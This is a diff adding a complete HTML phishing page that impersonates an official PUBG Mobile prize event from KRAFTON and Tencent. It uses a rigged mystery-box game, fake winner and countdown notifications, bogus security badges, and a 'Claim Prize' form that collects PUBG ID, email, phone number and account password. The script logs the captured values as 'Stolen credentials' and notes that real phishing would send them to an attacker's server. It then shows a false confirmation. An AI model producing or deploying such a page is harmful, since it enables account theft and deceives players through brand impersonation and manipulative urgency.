@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile Mystery Box Event</title>
+    <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        :root {
+            --primary: #ff5722;
+            --secondary: #ff9800;
+            --dark: #212121;
+            --light: #f5f5f5;
+            --accent: #ffeb3b;
+            --gold: #FFD700;
+            --silver: #C0C0C0;
+            --bronze: #CD7F32;
+            --box-gold: linear-gradient(135deg, #FFD700, #D4AF37);
+            --box-silver: linear-gradient(135deg, #C0C0C0, #A8A8A8);
+            --box-bronze: linear-gradient(135deg, #CD7F32, #B87333);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Oxanium', sans-serif;
+        }
+        
+        body {
+            background-color: #0a0a0a;
+            color: var(--light);
+            overflow-x: hidden;
+            position: relative;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255,215,0,0.1) 0%, transparent 25%),
+                radial-gradient(circle at 80% 70%, rgba(255,87,34,0.1) 0%, transparent 25%);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 2px solid var(--primary);
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo img {
+            height: 50px;
+            margin-right: 15px;
+        }
+        
+        .logo h1 {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 10px rgba(255, 87, 34, 0.3);
+        }
+        
+        .attempts-counter {
+            background: rgba(33, 33, 33, 0.7);
+            padding: 10px 20px;
+            border-radius: 5px;
+            border: 1px solid var(--primary);
+            box-shadow: 0 0 15px rgba(255, 87, 34, 0.5);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .attempts-counter .attempts {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .attempts-counter .attempt {
+            width: 15px;
+            height: 15px;
+            background-color: var(--primary);
+            border-radius: 50%;
+        }
+        
+        .attempts-counter .attempt.used {
+            background-color: #555;
+        }
+        
+        .main-content {
+            display: flex;
+            gap: 30px;
+            margin-top: 50px;
+        }
+        
+        .boxes-section {
+            flex: 1;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .boxes-container {
+            width: 100%;
+            background: rgba(33, 33, 33, 0.8);
+            border-radius: 10px;
+            padding: 30px;
+            border: 3px solid var(--primary);
+            box-shadow: 0 0 30px rgba(255, 87, 34, 0.5);
+            margin-bottom: 30px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .boxes-container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                transparent 45%,
+                rgba(255, 152, 0, 0.1) 48%,
+                rgba(255, 152, 0, 0.1) 52%,
+                transparent 55%
+            );
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+        
+        .boxes-grid {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+            place-items: center;
+        }
+        
+        /* New Cube Box Design */
+        .mystery-box {
+            position: relative;
+            width: 100px;
+            height: 100px;
+            transform-style: preserve-3d;
+            transition: all 0.5s ease;
+            cursor: pointer;
+            perspective: 1000px;
+        }
+        
+        .mystery-box-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transform-style: preserve-3d;
+            transition: transform 0.8s;
+        }
+        
+        .mystery-box.opened .mystery-box-inner {
+            transform: rotateX(-90deg);
+        }
+        
+        .mystery-box-face {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backface-visibility: hidden;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+            background: linear-gradient(145deg, #1e1e1e, #2a2a2a);
+        }
+        
+        .mystery-box-face.front {
+            transform: translateZ(50px);
+            background: var(--box-gold);
+            border: 2px solid var(--gold);
+        }
+        
+        .mystery-box-face.silver.front {
+            background: var(--box-silver);
+            border: 2px solid var(--silver);
+        }
+        
+        .mystery-box-face.bronze.front {
+            background: var(--box-bronze);
+            border: 2px solid var(--bronze);
+        }
+        
+        .mystery-box-face.top {
+            transform: rotateX(90deg) translateZ(50px);
+            background: rgba(0,0,0,0.7);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .mystery-box-face.top .prize-icon {
+            font-size: 30px;
+            margin-bottom: 5px;
+            animation: float 2s ease-in-out infinite;
+        }
+        
+        .mystery-box-face.top .prize-name {
+            font-size: 12px;
+            font-weight: bold;
+            text-align: center;
+            color: white;
+            text-shadow: 0 0 5px rgba(0,0,0,0.8);
+        }
+        
+        .mystery-box-face.right,
+        .mystery-box-face.left,
+        .mystery-box-face.back,
+        .mystery-box-face.bottom {
+            display: none;
+        }
+        
+        .mystery-box .box-lid {
+            position: absolute;
+            top: -10px;
+            left: 0;
+            width: 100%;
+            height: 10px;
+            background: rgba(0,0,0,0.5);
+            transform-origin: bottom;
+            transition: transform 0.5s;
+            z-index: 2;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+        }
+        
+        .mystery-box.opened .box-lid {
+            transform: rotateX(180deg);
+        }
+        
+        .mystery-box:hover:not(.opened) {
+            transform: translateY(-5px);
+        }
+        
+        .mystery-box.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        /* Floating particles */
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: -1;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            border-radius: 50%;
+            animation: floatParticle linear infinite;
+        }
+        
+        @keyframes floatParticle {
+            0% {
+                transform: translateY(0) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) translateX(20px);
+                opacity: 0;
+            }
+        }
+        
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+        
+        .login-section {
+            flex: 1;
+            background: rgba(33, 33, 33, 0.8);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--primary);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                transparent 45%,
+                rgba(255, 152, 0, 0.1) 48%,
+                rgba(255, 152, 0, 0.1) 52%,
+                transparent 55%
+            );
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+        
+        .login-section h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--accent);
+            font-size: 24px;
+            position: relative;
+            display: inline-block;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        
+        .login-section h2::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(to right, transparent, var(--primary), transparent);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--secondary);
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid #444;
+            border-radius: 5px;
+            color: var(--light);
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(255, 87, 34, 0.5);
+        }
+        
+        .form-group input::placeholder {
+            color: #777;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .submit-btn:hover {
+            background: linear-gradient(to right, #e64a19, #f57c00);
+            box-shadow: 0 5px 15px rgba(255, 87, 34, 0.4);
+        }
+        
+        .prizes-section {
+            margin-top: 50px;
+            background: rgba(33, 33, 33, 0.7);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid var(--primary);
+            width: 100%;
+        }
+        
+        .prizes-section h3 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--accent);
+            font-size: 20px;
+        }
+        
+        .prizes-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+        }
+
+        .prize-item {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 5px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid #444;
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+        
+        .prize-item:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 5px 15px rgba(255, 87, 34, 0.3);
+        }
+        
+        .prize-item img {
+            width: 100%;
+            height: 100px;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+        
+        .prize-item p {
+            margin-top: auto;
+            font-size: 14px;
+            color: var(--light);
+        }
+        
+        .winner-notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            background: linear-gradient(135deg, var(--dark), #333);
+            padding: 30px;
+            border-radius: 10px;
+            border: 3px solid var(--gold);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.8);
+            z-index: 100;
+            text-align: center;
+            width: 90%;
+            max-width: 500px;
+            transition: transform 0.5s;
+        }
+        
+        .winner-notification.active {
+            transform: translate(-50%, -50%) scale(1);
+        }
+        
+        .winner-notification h3 {
+            color: var(--gold);
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+        
+        .winner-notification p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .winner-notification .prize-text {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--gold);
+            margin: 15px 0;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        .box-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            filter: drop-shadow(0 0 5px rgba(0,0,0,0.5));
+        }
+        
+        .close-notification {
+            background: var(--gold);
+            color: #222;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 700;
+            transition: all 0.3s;
+        }
+        
+        .close-notification:hover {
+            background: #e6c200;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 99;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s;
+        }
+        
+        .overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px 0;
+            border-top: 1px solid #444;
+            font-size: 12px;
+            color: #777;
+        }
+        
+        .security-badge {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .security-badge img {
+            height: 30px;
+        }
+        
+        /* Animations */
+        @keyframes shine {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .shake {
+            animation: shake 0.5s infinite;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        /* Loading spinner */
+        .spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            margin: 10px auto;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Fake notifications */
+        .fake-notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(33, 33, 33, 0.9);
+            border-left: 4px solid var(--primary);
+            padding: 15px;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            max-width: 300px;
+            transform: translateX(150%);
+            transition: transform 0.5s;
+            z-index: 101;
+        }
+        
+        .fake-notification.show {
+            transform: translateX(0);
+        }
+        
+        .fake-notification h4 {
+            color: var(--primary);
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        
+        .fake-notification p {
+            font-size: 12px;
+            color: #ccc;
+        }
+        
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            cursor: pointer;
+        }
+        
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: var(--dark);
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 10px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            border: 1px solid var(--primary);
+            font-size: 12px;
+        }
+        
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        /* Confetti effect */
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: var(--gold);
+            opacity: 0;
+            z-index: 10;
+        }
+        
+        /* Won prizes section */
+        .won-prizes {
+            margin-top: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            border: 1px solid var(--primary);
+        }
+        
+        .won-prizes h4 {
+            text-align: center;
+            margin-bottom: 10px;
+            color: var(--accent);
+        }
+        
+        .won-prizes-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+        
+        .won-prize-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        /* Responsive styles */
+        @media (max-width: 992px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .boxes-container {
+                max-width: 100%;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .boxes-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        
+        @media (max-width: 576px) {
+            header {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .attempts-counter {
+                width: 100%;
+            }
+            
+            .boxes-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 10px;
+            }
+            
+            .mystery-box {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .mystery-box-face.front {
+                transform: translateZ(40px);
+            }
+            
+            .mystery-box-face.top {
+                transform: rotateX(90deg) translateZ(40px);
+            }
+            
+            .prizes-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="container">
+        <header>
+            <div class="logo">
+                <img src="https://i.ibb.co/vxXz0FqW/pubg.png" alt="pubg" border="0">
+                <h1>PUBG Mobile Mystery Box</h1>
+            </div>
+            <div class="attempts-counter">
+                <span>Daily Attempts:</span>
+                <div class="attempts" id="attempts">
+                    <div class="attempt"></div>
+                    <div class="attempt"></div>
+                    <div class="attempt"></div>
+                </div>
+            </div>
+        </header>
+        
+        <div class="main-content">
+            <div class="boxes-section">
+                <div class="boxes-container">
+                    <h3 style="text-align: center; color: var(--accent); margin-bottom: 20px;">Choose a Luxury Box to Open</h3>
+                    <div class="boxes-grid" id="boxesGrid"></div>
+                    
+                    <div class="won-prizes">
+                        <h4>Your Won Prizes</h4>
+                        <div class="won-prizes-list" id="wonPrizesList">
+                            <!-- Won prizes will appear here -->
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="prizes-section">
+                    <h3>Available Prizes</h3>
+                    <div class="prizes-grid">
+                        <div class="prize-item">
+                            <img src="https://i.ibb.co/4nHqwBz0/skin.jpg" alt="Cyber Phantom">
+                            <p>Cyber Phantom</p>
+                        </div>
+                        <div class="prize-item">
+                            <img src="https://i.ibb.co/B59pH8bY/skin2.jpg" alt="Mythic Skin">
+                            <p>Mythic Skin</p>
+                        </div>
+                        <div class="prize-item">
+                            <img src="https://i.ibb.co/B59pH8bY/uc.jpg" alt="5,000 UC">
+                            <p>5,000 UC</p>
+                        </div>
+                        <div class="prize-item">
+                            <img src="https://i.ibb.co/B59pH8bY/vehicle.jpg" alt="Special Vehicle">
+                            <p>Special Vehicle</p>
+                        </div>
+                        <div class="prize-item">
+                            <img src="https://i.ibb.co/B59pH8bY/uc2.jpg" alt="2,000 UC">
+                            <p>2,000 UC</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="login-section">
+                <h2>Claim Your Prize</h2>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label for="pubgId">PUBG ID</label>
+                        <input type="text" id="pubgId" placeholder="123456789" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" placeholder="example@gmail.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Phone Number</label>
+                        <input type="tel" id="phone" placeholder="+1234567890" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password <span class="tooltip">(?)
+                            <span class="tooltiptext">Password is required for your account security</span>
+                        </span></label>
+                        <input type="password" id="password" placeholder="********" required>
+                    </div>
+                    <div class="spinner" id="spinner"></div>
+                    <button type="submit" class="submit-btn">Claim Prize</button>
+                </form>
+                
+                <div class="security-badge">
+                    <img src="https://i.ibb.co/0jQ7Z0T/ssl.png" alt="SSL Secure">
+                    <img src="https://i.ibb.co/4Y3L4J3/antivirus.png" alt="Virus Protection">
+                    <img src="https://i.ibb.co/0jQ7Z0T/trusted.png" alt="Trusted Site">
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2023 PUBG MOBILE Official Event. All rights reserved.</p>
+            <p>Official event of KRAFTON, Inc. and Tencent Games.</p>
+        </footer>
+    </div>
+    
+    <div class="winner-notification" id="winnerNotification">
+        <h3>CONGRATULATIONS!</h3>
+        <div class="prize-text" id="prizeText">5,000 UC</div>
+        <p>Fill in your information and click "Claim Prize" to receive your reward.</p>
+        <button class="close-notification" id="closeNotification">OK</button>
+    </div>
+    
+    <div class="overlay" id="overlay"></div>
+    
+    <div class="fake-notification" id="fakeNotification1">
+        <h4>New winner!</h4>
+        <p>Player from USA just won 10,000 UC!</p>
+    </div>
+    
+    <div class="fake-notification" id="fakeNotification2">
+        <h4>Warning!</h4>
+        <p>Only 12 hours left until the event ends!</p>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Create floating particles
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random position
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                
+                // Random size
+                const size = Math.random() * 5 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random opacity
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
+                
+                // Random animation duration and delay
+                const duration = Math.random() * 20 + 10;
+                const delay = Math.random() * 10;
+                particle.style.animation = `floatParticle ${duration}s linear ${delay}s infinite`;
+                
+                particlesContainer.appendChild(particle);
+            }
+            
+            // Box setup
+            const boxesGrid = document.getElementById('boxesGrid');
+            const attemptsDisplay = document.getElementById('attempts');
+            const attempts = Array.from(attemptsDisplay.children);
+            const wonPrizesList = document.getElementById('wonPrizesList');
+            
+            const prizes = [
+                { name: "5,000 UC", type: "win", icon: "💰", class: "gold" },
+                { name: "Cyber Phantom", type: "win", icon: "👕", class: "gold" },
+                { name: "2,000 UC", type: "win", icon: "💰", class: "silver" },
+                { name: "Mythic Skin", type: "win", icon: "👕", class: "silver" },
+                { name: "Special Vehicle", type: "win", icon: "🚗", class: "silver" },
+                { name: "Try Again", type: "lose", icon: "❌", class: "bronze" },
+                { name: "Try Again", type: "lose", icon: "❌", class: "bronze" },
+                { name: "Try Again", type: "lose", icon: "❌", class: "bronze" },
+                { name: "Try Again", type: "lose", icon: "❌", class: "bronze" },
+                { name: "Try Again", type: "lose", icon: "❌", class: "bronze" }
+            ];
+            
+            // Shuffle prizes array
+            function shuffleArray(array) {
+                for (let i = array.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [array[i], array[j]] = [array[j], array[i]];
+                }
+                return array;
+            }
+            
+            // Create boxes
+            function createBoxes() {
+                boxesGrid.innerHTML = '';
+                const shuffledPrizes = shuffleArray([...prizes]);
+                
+                shuffledPrizes.forEach((prize, index) => {
+                    const box = document.createElement('div');
+                    box.className = 'mystery-box';
+                    
+                    box.innerHTML = `
+                        <div class="mystery-box-inner">
+                            <div class="mystery-box-face front ${prize.class}">
+                               <img src="https://i.ibb.co/j9z8R4DZ/pubgbox.png" alt="pubgbox" border="0" class="box-image">
+                            </div>
+                            <div class="mystery-box-face top">
+                                <div class="prize-icon">${prize.icon}</div>
+                                <div class="prize-name">${prize.name}</div>
+                            </div>
+                            <div class="box-lid"></div>
+                        </div>
+                    `;
+                    
+                    box.dataset.prize = prize.name;
+                    box.dataset.type = prize.type;
+                    box.dataset.icon = prize.icon;
+                    boxesGrid.appendChild(box);
+                });
+            }
+            
+            // Initialize boxes
+            createBoxes();
+            
+            // Attempts management
+            let remainingAttempts = 3;
+            const maxAttempts = 3;
+            const wonPrizes = [];
+            
+            function updateAttemptsDisplay() {
+                attempts.forEach((attempt, index) => {
+                    if (index < remainingAttempts) {
+                        attempt.classList.remove('used');
+                    } else {
+                        attempt.classList.add('used');
+                    }
+                });
+            }
+            
+            updateAttemptsDisplay();
+            
+            // Add won prize to list
+            function addWonPrize(prize, icon) {
+                wonPrizes.push(prize);
+                const prizeItem = document.createElement('div');
+                prizeItem.className = 'won-prize-item';
+                prizeItem.innerHTML = `${icon} ${prize}`;
+                wonPrizesList.appendChild(prizeItem);
+            }
+            
+            // Box click handler
+            boxesGrid.addEventListener('click', function(e) {
+                const box = e.target.closest('.mystery-box');
+                if (!box || box.classList.contains('opened') || remainingAttempts <= 0) return;
+                
+                remainingAttempts--;
+                updateAttemptsDisplay();
+                
+                box.classList.add('opened');
+                
+                // Check if prize was won
+                if (box.dataset.type === "win") {
+                    setTimeout(() => {
+                        showWinnerNotification(box.dataset.prize);
+                        createConfetti();
+                        addWonPrize(box.dataset.prize, box.dataset.icon);
+                    }, 800);
+                }
+                
+                // Disable all boxes when attempts run out
+                if (remainingAttempts <= 0) {
+                    const allBoxes = document.querySelectorAll('.mystery-box:not(.opened)');
+                    allBoxes.forEach(b => b.classList.add('disabled'));
+                }
+            });
+            
+            // Create confetti effect
+            function createConfetti() {
+                const colors = ['#FFD700', '#FF0000', '#00FF00', '#0000FF', '#FFFFFF'];
+                const container = document.querySelector('.boxes-container');
+                
+                for (let i = 0; i < 50; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = `${Math.random() * 100}%`;
+                    confetti.style.top = `${Math.random() * 100}%`;
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.width = `${Math.random() * 10 + 5}px`;
+                    confetti.style.height = `${Math.random() * 10 + 5}px`;
+                    confetti.style.opacity = '1';
+                    container.appendChild(confetti);
+                    
+                    // Animate confetti
+                    const animation = confetti.animate([
+                        { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
+                        { transform: `translateY(${Math.random() * 200 + 100}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                    ], {
+                        duration: Math.random() * 2000 + 1000,
+                        easing: 'cubic-bezier(0.1, 0.8, 0.9, 1)'
+                    });
+                    
+                    animation.onfinish = () => confetti.remove();
+                }
+            }
+            
+            // Winner notification
+            const winnerNotification = document.getElementById('winnerNotification');
+            const overlay = document.getElementById('overlay');
+            const closeNotification = document.getElementById('closeNotification');
+            const prizeText = document.getElementById('prizeText');
+            
+            function showWinnerNotification(prize) {
+                prizeText.textContent = prize;
+                overlay.classList.add('active');
+                winnerNotification.classList.add('active');
+            }
+            
+            closeNotification.addEventListener('click', function() {
+                overlay.classList.remove('active');
+                winnerNotification.classList.remove('active');
+            });
+            
+            // Fake notifications
+            const fakeNotification1 = document.getElementById('fakeNotification1');
+            const fakeNotification2 = document.getElementById('fakeNotification2');
+            
+            setTimeout(() => {
+                fakeNotification1.classList.add('show');
+                
+                setTimeout(() => {
+                    fakeNotification2.classList.add('show');
+                    
+                    setTimeout(() => {
+                        fakeNotification1.classList.remove('show');
+                        
+                        setTimeout(() => {
+                            fakeNotification2.classList.remove('show');
+                        }, 5000);
+                    }, 5000);
+                }, 3000);
+            }, 10000);
+            
+            // Form submission
+            const loginForm = document.getElementById('loginForm');
+            const spinner = document.getElementById('spinner');
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const pubgId = document.getElementById('pubgId').value;
+                const email = document.getElementById('email').value;
+                const phone = document.getElementById('phone').value;
+                const password = document.getElementById('password').value;
+                
+                // Show loading spinner
+                spinner.style.display = 'block';
+                
+                // Simulate API call
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    
+                    // In a real phishing scenario, this data would be sent to attacker's server
+                    console.log('Stolen credentials:', { pubgId, email, phone, password });
+                    
+                    // Show fake success message
+                    alert('Your prize has been successfully confirmed! It will be added to your account within 24 hours.');
+                    
+                    // Reset form
+                    loginForm.reset();
+                }, 2000);
+            });
+            
+            // Reset attempts daily
+            function resetAttemptsDaily() {
+                const now = new Date();
+                const nextDay = new Date(
+                    now.getFullYear(),
+                    now.getMonth(),
+                    now.getDate() + 1,
+                    0, 0, 0
+                );
+                
+                const timeUntilReset = nextDay - now;
+                
+                setTimeout(() => {
+                    remainingAttempts = maxAttempts;
+                    updateAttemptsDisplay();
+                    createBoxes();
+                    
+                    // Set up the next reset
+                    resetAttemptsDaily();
+                }, timeUntilReset);
+            }
+            
+            // Start the daily reset cycle
+            resetAttemptsDaily();
+        });
+    </script>
+</body>
+</html>
